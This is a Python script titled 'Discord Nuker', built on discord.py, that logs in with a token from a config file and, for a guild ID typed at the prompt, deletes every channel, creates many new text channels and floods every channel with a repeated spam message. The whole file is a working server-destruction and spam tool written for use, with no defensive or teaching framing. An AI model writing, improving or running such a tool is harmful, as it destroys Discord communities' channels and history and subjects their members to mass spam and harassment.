# ▶ DISCORD NUKER
import discord
import asyncio
import json
import logging

# ▶ LOAD CONFIG
with open("config.json") as f:
    config = json.load(f)

# ▶ SET INTENT
intents = discord.Intents.default()

# ▶ SET LOGGED
logging.disable(logging.CRITICAL)

# ▶ CLASS NUKER
class Nuker(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.token = config["token"]
        self.guild = config["guild_name"]
        self.channel = config["channel_name"]
        self.message = config["message_content"]
        self.delay = asyncio.Semaphore(config["delay"])

    # ▶ DELETE CHANNELS
    async def delchannel(self, guild):
        async def delete(channel):
            async with self.delay:
                await channel.delete()
                await asyncio.sleep(0.8)
                print(f"Channel {channel.name} deleted")

        # ▶ ASYNCIO
        await asyncio.gather(*[delete(channel) for channel in guild.channels])       

    # ▶ CREATE CHANNELS
    async def crechannel(self, guild):
        async def create():
            async with self.delay:
                await guild.create_text_channel(self.channel)
                await asyncio.sleep(0.8)
                print(f"Text channel {self.channel} created")

        # ▶ ASYNCIO
        await asyncio.gather(*[create() for i in range(self.num_channel)])

    # ▶ SPAM MESSAGES
    async def massping(self, guild):
        async def ping(channel):
            async with self.delay:
                await channel.send(self.message)
                await asyncio.sleep(0.8)
                print(f"Message sent to {channel.name}")

        # ▶ ASYNCIO
        for i in range(self.num_message):
            await asyncio.gather(*[ping(channel) for channel in guild.channels])

    # ▶ ON READY
    async def on_ready(self):
        self.guild_id = int(input("Enter Guild ID: "))
        self.num_channel = int(input("Enter Channel Number: "))
        self.num_message = int(input("Enter Message Number: "))

        # ▶ GET GUILD
        guild = self.get_guild(self.guild_id)

        # ▶ RUN EXECUTE
        await self.delchannel(guild)
        await self.crechannel(guild)
        await self.massping(guild)

# ▶ RUN NUKER
nuker = Nuker()
nuker.run(nuker.token)
